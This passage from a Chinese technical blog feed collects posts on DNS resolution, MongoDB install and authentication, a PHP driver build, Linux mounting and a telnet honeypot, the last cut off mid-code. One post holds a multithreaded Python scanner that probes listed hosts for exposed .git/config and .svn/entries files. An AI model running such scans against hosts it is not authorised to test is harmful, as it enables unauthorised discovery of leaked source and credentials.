      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python多线程编程之Git、SVN信息泄露</title>
      <link href="/2016/07/08/python_Git_SVN/"/>
      <url>/2016/07/08/python_Git_SVN/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>&emsp;&emsp;一直想学习Python多线程利用，正好利用requests包检测Git和SVN信息泄露<br><a id="more"></a></p><h2 id="0x01原理"><a href="#0x01原理" class="headerlink" title="0x01原理"></a>0x01原理</h2><p>&emsp;&emsp;读取IP或者域名地址文件，通过requests包的get请求，返回http包状态为200的URL，为了解决网站错误默认页面返回也是200 OK的情况加入了字符匹配判断。可以根据需要添加功能更强的正则匹配筛选。</p><h2 id="0x02代码"><a href="#0x02代码" class="headerlink" title="0x02代码"></a>0x02代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = [<span class="string">"/.git/config"</span>, <span class="string">"/.svn/entries"</span>]</span><br><span class="line">fip = open(<span class="string">'test_ip.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">queueLock = threading.Lock()</span><br><span class="line">workQueue = Queue.Queue()</span><br><span class="line">thread_num = <span class="number">30</span></span><br><span class="line">threads = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, Queue,id)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.q = Queue</span><br><span class="line">        self.id = id</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> workQueue.empty():</span><br><span class="line">            get_info(self.q.get())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_info</span><span class="params">(ip)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">"http://"</span> + ip + payload</span><br><span class="line">        <span class="keyword">print</span> target</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = requests.get(target, timeout = <span class="number">5</span>)</span><br><span class="line">            <span class="keyword">if</span> result.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">if</span> result.text.find(<span class="string">'[remote "origin"]'</span>) != <span class="number">-1</span> <span class="keyword">or</span> result.text.find(<span class="string">'http://svn'</span>) != <span class="number">-1</span>:</span><br><span class="line">                    queueLock.acquire()</span><br><span class="line">                    ff = open(<span class="string">'seccess.txt'</span>, <span class="string">'a+'</span>)</span><br><span class="line">                    ff.write(target + <span class="string">'\n'</span>)</span><br><span class="line">                    queueLock.release()</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> fip:</span><br><span class="line">        workQueue.put(ip.strip())</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(thread_num):</span><br><span class="line">        thread = MyThread(workQueue,i)</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Git </tag>
            
            <tag> SVN </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DNS迭代解析和DNS记录类型及含义</title>
      <link href="/2016/06/23/DNS/"/>
      <url>/2016/06/23/DNS/</url>
      <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>&emsp;&emsp;最近研究DNS数据，借此机会简单分析DNS解析的过程和DNS记录类型及含义。<br><a id="more"></a></p><h2 id="0x01-DNS记录类型及含义"><a href="#0x01-DNS记录类型及含义" class="headerlink" title="0x01 DNS记录类型及含义"></a>0x01 DNS记录类型及含义</h2><table><thead><tr><th>记录类型</th><th>含义简介</th></tr></thead><tbody><tr><td>A（Address）</td><td>指定域名对应的IPv4地址</td></tr><tr><td>AAAA</td><td>指定域名对应的IPv6地址</td></tr><tr><td>NS（Name Server）</td><td>指定该域名由哪个DNS服务器来进行解析</td></tr><tr><td>MX（Mail Exchanger）</td><td>邮件交换记录，用于电子邮件系统发邮件时根据收信人的地址后缀来定位邮件服务器</td></tr><tr><td>CNAME（Canonical Name ）</td><td>别名记录，多个域名映射到同一台计算机（如同一主机提供mail和www服务）</td></tr><tr><td>TXT</td><td>主机名或域名的说明</td></tr><tr><td>TTL（Time-To-Live）</td><td>DNS服务器中保存的时间</td></tr><tr><td>PTR</td><td>将一个主机地址映射到对应的域名</td></tr><tr><td>HINFO</td><td>说明映射到特定 DNS 主机名的 CPU 类型和操作系统类型</td></tr></tbody></table><h2 id="0x02DNS解析过程"><a href="#0x02DNS解析过程" class="headerlink" title="0x02DNS解析过程"></a>0x02DNS解析过程</h2><p>如下是DNS迭代解析流程图<br><img src="/static/picture/dns.png" alt="DNS迭代解析流程图"><br>&emsp;&emsp;1. 客户端向本地DNS服务器发出请求（如：<a href="http://www.jd.com）" target="_blank" rel="noopener">www.jd.com）</a><br> &emsp;&emsp;2. 本地DNS服务器向根域名服务器发出请求，得到com顶级域名服务器的地址<br>&emsp;&emsp;3. 本地DNS服务器向com顶级域服务器发出请求，得到jd.com权威域名服务器的地址<br> &emsp;&emsp;4. 本地DNS服务器向jd.com顶级域服务器发出请求，得到<a href="http://www.jd.com的地址" target="_blank" rel="noopener">www.jd.com的地址</a><br>&emsp;&emsp;5. 本地DNS服务器返回<a href="http://www.jd.com的ip地址给客户端" target="_blank" rel="noopener">www.jd.com的ip地址给客户端</a></p><h2 id="0x03-实际操作"><a href="#0x03-实际操作" class="headerlink" title="0x03 实际操作"></a>0x03 实际操作</h2><p>利用Linux自带的dig +trace选项追踪<a href="http://www.jd.com的DNS解析过程，具体结果如下：" target="_blank" rel="noopener">www.jd.com的DNS解析过程，具体结果如下：</a></p><p>1.向根域名服务器发出请求，得到com顶级域名服务器的地址<br><img src="/static/picture/dns1.png" alt="向根域名服务器发出请求"></p><p>2.向com顶级域服务器发出请求，得到jd.com权威域名服务器的地址<br><img src="/static/picture/dns2.png" alt="向com顶级域服务器发出请求,得到jd.com权威域名服务器的地址"></p><p>3.向jd.com顶级域服务器发出请求，得到<a href="http://www.jd.com的地址" target="_blank" rel="noopener">www.jd.com的地址</a><br><img src="/static/picture/dns3.png" alt="向jd.com顶级域服务器发出请求，得到www.jd.com的地址"></p><p>4.返回<a href="http://www.jd.com的ip地址给客户端" target="_blank" rel="noopener">www.jd.com的ip地址给客户端</a><br><img src="/static/picture/dns4.png" alt="返回www.jd.com的ip地址"></p>]]></content>
      
      <categories>
          
          <category> 协议分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MongoDB-3.2 安装及认证配置</title>
      <link href="/2016/06/12/MongoDB_install/"/>
      <url>/2016/06/12/MongoDB_install/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>&emsp;&emsp;前段时间学习mongodb,安装mongodb最新版3.2.X,然后安全配置。网上搜索都是低版本的设置，坑太多，写下了做个笔记备用<br><a id="more"></a></p><h2 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h2><p>我的系统是：Ubuntu 14.04<br>看得懂英文的直接参考：<a href="https://docs.mongodb.com/manual/tutorial/install-mongodb-on-ubuntu/" target="_blank" rel="noopener">mongodb官网安装教程</a>（其实不需要懂英语）</p><ul><li><p>添加key:<br><code>sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv EA312927</code></p></li><li><p>创建mongodb文件清单：<br><code>echo &quot;deb http://repo.mongodb.org/apt/ubuntu trusty/mongodb-org/3.2 multiverse&quot; | sudo tee /etc/apt/sources.list.d/mongodb-org-3.2.list</code></p></li><li>更新源<br><code>sudo apt-get update</code></li><li>若安装最新版：<br><code>sudo apt-get install -y mongodb-org</code></li><li>若安装指定版本（修改对应版本号）：<br><code>sudo apt-get install -y mongodb-org=3.2.0 mongodb-org-server=3.2.0 mongodb-org-shell=3.2.0 mongodb-org-mongos=3.2.0 mongodb-org-tools=3.2.0</code></li></ul><h2 id="0x02使用"><a href="#0x02使用" class="headerlink" title="0x02使用"></a>0x02使用</h2><ul><li>启动mongo服务：<br><code>sudo service mongod start</code></li><li>停止mongo服务：<br><code>sudo service mongod stop</code></li><li>重启mongo服务：<br><code>sudo service mongod restart</code></li></ul><h2 id="0x03安全配置"><a href="#0x03安全配置" class="headerlink" title="0x03安全配置"></a>0x03安全配置</h2><p>注：默认情况下mongodb是没有访问验证的，这才导致了很多的未授权访问泄露铭感信息。<br>&emsp;&emsp;<strong>打开认证需要先建立用户然后开启认证配置</strong>。在mongodb中认证是基于数据库的，新建用户的时候申明他的角色（权限），该用户只有在对应的数据库下才能操作，admin需要先在admin数据库下认证然后切换到其他需要操作的数据库</p><h3 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h3><p>NO.1新建管理员用户<br>shell执行：</p><ul><li><code>mongo 192.168.1.101</code></li><li><code>use admin</code></li><li><code>db.createUser({&quot;user&quot;:&quot;你的用户名&quot;,&quot;pwd&quot;:&quot;你的密码&quot;,&quot;roles&quot;:[{role:&quot;root&quot;,db:&quot;admin&quot;}]})</code><br>注：更加详细的角色配置参考：<a href="https://docs.mongodb.com/manual/reference/command/createUser/#dbcmd.createUser" target="_blank" rel="noopener">createUser</a> 和 <a href="https://docs.mongodb.com/manual/reference/built-in-roles/#built-in-roles" target="_blank" rel="noopener">角色管理</a></li></ul><p>NO.2打开配置文件<br><code>sudo nano /etc/mongod.conf</code></p><p>编辑mongd.conf文件如下：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># mongod.conf</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># for documentation of all options, see:</span></span><br><span class="line"><span class="meta">#   http:<span class="comment">//docs.mongodb.org/manual/reference/configuration-options/</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># Where and how to store data.</span></span><br><span class="line"><span class="symbol">storage:</span></span><br><span class="line"><span class="symbol">  dbPath:</span> <span class="meta-keyword">/var/</span>lib/mongodb</span><br><span class="line"><span class="symbol">  journal:</span></span><br><span class="line"><span class="symbol">    enabled:</span> true</span><br><span class="line"><span class="meta">#  engine:</span></span><br><span class="line"><span class="meta">#  mmapv1:</span></span><br><span class="line"><span class="meta">#  wiredTiger:</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># where to write logging data.</span></span><br><span class="line"><span class="symbol">systemLog:</span></span><br><span class="line"><span class="symbol">  destination:</span> file</span><br><span class="line"><span class="symbol">  logAppend:</span> true</span><br><span class="line"><span class="symbol">  path:</span> <span class="meta-keyword">/var/</span>log<span class="meta-keyword">/mongodb/</span>mongod.log</span><br><span class="line"></span><br><span class="line"><span class="meta"># network interfaces</span></span><br><span class="line"><span class="symbol">net:</span></span><br><span class="line"><span class="symbol">  port:</span> <span class="number">27017</span></span><br><span class="line"><span class="symbol">  bindIp:</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.101</span>  <span class="meta">#绑定ip</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#processManagement:</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">security:</span>               <span class="meta">#打开认证</span></span><br><span class="line"><span class="symbol">  authorization:</span> enabled</span><br><span class="line"></span><br><span class="line"><span class="meta">#operationProfiling:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#replication:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#sharding:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">## Enterprise-Only Options:</span></span><br></pre></td></tr></table></figure></p><p>保存退出</p><p>No.3重启mongodb服务<br><code>sudo service mongod restart</code><br>注：多执行几次，如果发现 stop 提示** unknown就说明配置文件修改不对，认真核对修改mongod.conf文件即可。</p>]]></content>
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ubuntu源码安装PHP MongoDB驱动</title>
      <link href="/2016/06/10/Ubuntu_php_MongoDB/"/>
      <url>/2016/06/10/Ubuntu_php_MongoDB/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>&emsp;&emsp;尝试了几种网上介绍ubuntu系统下PHP MongoDB驱动的安装教程，大多都是说直接pecl安装，然而我的系统并不支持这种安装，只能用源代码安装了，虽说简单，但是也有一些小坎需要注意，记录一下。<br><a id="more"></a></p><h2 id="0x01安装"><a href="#0x01安装" class="headerlink" title="0x01安装"></a>0x01安装</h2><p><strong>可以参考<a href="http://php.net/manual/zh/mongo.installation.php" target="_blank" rel="noopener">官方教程</a>，文件下载地址：<a href="https://github.com/mongodb/mongo-php-driver-legacy" target="_blank" rel="noopener">Github</a></strong><br>第一步：linux下可以利用wget下载,<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="regexp">//gi</span>thub.com<span class="regexp">/mongodb/m</span>ongo-php-driver-legacy<span class="regexp">/archive/m</span>aster.zip</span><br></pre></td></tr></table></figure></p><p>下载完成解压master.zip文件得到mongo-php-driver-legacy-master(根据实际文件名而定)<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip <span class="literal">master</span>.zip</span><br></pre></td></tr></table></figure></p><p>第二步：编译<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> mongo-php-driver-legacy-master</span><br><span class="line">sudo ./configure</span><br><span class="line">sudo  <span class="keyword">make</span> <span class="keyword">all</span></span><br><span class="line">sudo <span class="keyword">make</span> install</span><br></pre></td></tr></table></figure></p><p>第三步：安装配置<br>1.需要把编译生成的文件mongo.so拷贝到php扩展文件的目录<br>mongo.so文件目录为：./modules/mongo.so<br>php扩展文件目录通过如下命令查看：<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -i <span class="string">| grep extension_dir</span></span><br></pre></td></tr></table></figure></p><p>输出如下：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension_dir =&gt; <span class="regexp">/usr/</span>lib<span class="regexp">/php5/</span><span class="number">20121212</span> =&gt; <span class="regexp">/usr/</span>lib<span class="regexp">/php5/</span><span class="number">20121212</span></span><br></pre></td></tr></table></figure></p><p>由此得知php扩展文件的路径,执行如下拷贝命令<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp ./modules/mongo.so /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">php5</span>/20121212</span></span><br></pre></td></tr></table></figure></p><p>2.添加extension=mongo.so到php.ini文件<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;;;;;;;;;;;;;;;;;;;;;;</span></span><br><span class="line"><span class="comment">; Dynamic Extensions ;</span></span><br><span class="line"><span class="comment">;;;;;;;;;;;;;;;;;;;;;;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">extension</span>=mongo.so</span><br><span class="line"></span><br><span class="line"><span class="comment">; If you wish to have an extension loaded automatically, use the following</span></span><br><span class="line"><span class="comment">; syntax:</span></span><br><span class="line"><span class="comment">;</span></span><br><span class="line"><span class="comment">;   extension=modulename.extension</span></span><br><span class="line"><span class="comment">;</span></span><br><span class="line"><span class="comment">; For example, on Windows:</span></span><br><span class="line"><span class="comment">;</span></span><br><span class="line"><span class="comment">;   extension=msql.dll</span></span><br><span class="line"><span class="comment">;</span></span><br><span class="line"><span class="comment">; ... or under UNIX:</span></span><br><span class="line"><span class="comment">;</span></span><br><span class="line"><span class="comment">;   extension=msql.so</span></span><br><span class="line"><span class="comment">;</span></span><br><span class="line"><span class="comment">; ... or with a path:</span></span><br><span class="line"><span class="comment">;</span></span><br><span class="line"><span class="comment">;   extension=/path/to/extension/msql.so</span></span><br><span class="line"><span class="comment">;</span></span><br><span class="line"><span class="comment">; If you only provide the name of the extension, PHP will look for it in its</span></span><br><span class="line"><span class="comment">; default extension directory.</span></span><br></pre></td></tr></table></figure></p><p>注：也可以不用复制，只配置extension=/绝对路径/mongo.so，不推荐该方式（易误删）<br>第四步：测试<br>查看phpinfo信息看到mongo即为成功安装</p>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux挂载移动硬盘或U盘</title>
      <link href="/2016/06/06/Linux_mount/"/>
      <url>/2016/06/06/Linux_mount/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>&emsp;&emsp;挂载的含义：Linux系统把所有的设备都视为文件，不同的设备文件在根目录（树的根）开始的某个路径之下（树枝），所以要使用设备需要将其指定在特定的路径之下（就像挂载某一树枝上）所以叫挂载。Linux直接插上移动硬盘或U盘是无法使用的，接着我们就自己挂载使用吧。</p><a id="more"></a><h2 id="0x01小白最简单的使用方式"><a href="#0x01小白最简单的使用方式" class="headerlink" title="0x01小白最简单的使用方式"></a>0x01小白最简单的使用方式</h2><ol><li>fdisk -l 查看得到自己要挂载的设备名字<br>注：linux下移动硬盘和U盘的文件名都是/dev/sd[a-p]<br><img src="/static/picture/fdisk_l.jpg" alt="查看设备名"><br>可以看到我的移动硬盘有4个分区（其中system字段值为“W95 Ext’d (LBA)”的是移动硬盘的逻辑分区），然后确定（根据容量或者顺序）我要挂载的设备名/dev/sdb5/</li><li><p>mount 设备名 挂载路径名<br><code>mount /dev/sdb5/ ./data/</code><br>注：路径可以是绝对路径 /home/data/,也可以是相对路径 ./data/</p></li><li><p>检查是否成功<br><code>cd ./data/</code><br><code>ls</code><br>看到设备中的文件即挂载成功</p></li></ol><h2 id="0x02-mount命令"><a href="#0x02-mount命令" class="headerlink" title="0x02 mount命令"></a>0x02 mount命令</h2><p>&emsp;&emsp;在命令行输入：<code>mount -h</code> </p><pre><code>The command is `mount [-t fstype] something somewhere&apos;.Details found in /etc/fstab may be omitted.       mount -a [-t|-O] ...     : mount all stuff from /etc/fstab       mount device             : mount device at the known place       mount directory          : mount known device here       mount -t type dev dir    : ordinary mount commandNote that one does not really mount a device, one mountsa filesystem (of the given type) found on the device.One can also mount an already visible directory tree elsewhere:       mount --bind olddir newdiror move a subtree:       mount --move olddir newdirOne can change the type of mount containing the directory dir:       mount --make-shared dir       mount --make-slave dir       mount --make-private dir       mount --make-unbindable dirOne can change the type of all the mounts in a mount subtreecontaining the directory dir:       mount --make-rshared dir       mount --make-rslave dir       mount --make-rprivate dir       mount --make-runbindable dirA device can be given by name, say /dev/hda1 or /dev/cdrom,or by label, using  -L label  or by uuid, using  -U uuid .Other options: [-nfFrsvw] [-o options] [-p passwdfd].For many more details, say  man 8 mount .</code></pre>]]></content>
      
      <categories>
          
          <category> 技术研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>基于Twisted的Telnet简单蜜罐</title>
      <link href="/2016/06/03/telnet_honeypot/"/>
      <url>/2016/06/03/telnet_honeypot/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>&emsp;&emsp;利用Twisted端口绑定，读取socket的输入命令，然后给出预设的输出，此次实现的telnet蜜罐比较简单，就算是编程练习把。<br><a id="more"></a></p><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> twisted.internet.protocol <span class="keyword">import</span> Factory</span><br><span class="line"><span class="keyword">from</span> twisted.protocols.basic <span class="keyword">import</span> LineReceiver</span><br><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">WELCOME_MSG = <span class="string">'Welcome to Microsoft Telnet Client '</span></span><br><span class="line">LOGIN_SUCCESS = <span class="string">'*===============================================================\n\r\</span></span><br><span class="line"><span class="string">Microsoft Telnet Server.\n\r\</span></span><br><span class="line"><span class="string">*===============================================================\n\r'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Telnet</span><span class="params">(LineReceiver)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.name = <span class="keyword">None</span></span><br><span class="line">        self.password = <span class="keyword">None</span></span><br><span class="line">        self.state = <span class="string">'get_name'</span></span><br><span class="line">        self.prefix = <span class="string">'C:\\Users\\Administrator\&gt;'</span></span><br><span class="line">        logging.basicConfig(filename=<span class="string">'./telnet.log'</span>, level=logging.DEBUG, format=<span class="string">'%(asctime)s %(levelname)s: %(message)s'</span>, datefmt = <span class="string">'%Y-%m-%d %I:%M:%S'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connectionMade</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sendLine(LOGIN_SUCCESS)</span><br><span class="line">        self.transport.write(<span class="string">'login:'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connectionLost</span><span class="params">(self, line)</span>:</span></span><br><span class="line">        logging.info(<span class="string">"connection closed"</span>)</span><br><span class="line">        self.state = <span class="string">'get_name'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lineReceived</span><span class="params">(self, line)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="string">'get_name'</span>:</span><br><span class="line">            self.name = line</span><br><span class="line">            self.state = <span class="string">'get_pass'</span></span><br><span class="line">            self.transport.write(<span class="string">'password:'</span>)</span><br><span class="line">        <span class="keyword">elif</span> self.state == <span class="string">'get_pass'</span>:</span><br><span class="line">            self.password = line</span><br><span class="line">            logging.info(self.name +<span class="string">' '</span> + self.password )</span><br><span class="line">            self.state = <span class="string">'get_command'</span></span><br><span class="line">            self.transport.write(self.prefix)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.info(<span class="string">"command"</span> + <span class="string">' '</span> + line)</span><br><span class="line">            self.handle_command(line)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_command</span><span class="params">(self, line)</span>:</span></span><br><span class="line">        command = line.strip().lower()</span><br><span class="line">        <span class="keyword">if</span> command.startswith(<span class="string">'dir'</span>):</span><br><span class="line">            self.sendLine(<span class="string">""</span>)</span><br><span class="line">            self.sendLine(<span class="string">"2016/04/11  17:55    &lt;DIR&gt;          ."</span>)</span><br><span class="line">            self.sendLine(<span class="string">"2016/04/11  17:55    &lt;DIR&gt;          .."</span>)</span><br><span class="line">            self.sendLine(<span class="string">"2016/04/26  16:52    &lt;DIR&gt;          Desktop"</span>)</span><br><span class="line">            self.sendLine(<span class="string">"2016/04/11  17:42    &lt;DIR&gt;          Documents"</span>)</span><br><span class="line">            self.sendLine(<span class="string">"2016/04/11  17:42    &lt;DIR&gt;          Downloads"</span>)</span><br><span class="line">            self.sendLine(<span class="string">"2016/04/11  17:55    &lt;DIR&gt;          Favorites"</span>)</span><br><span class="line">            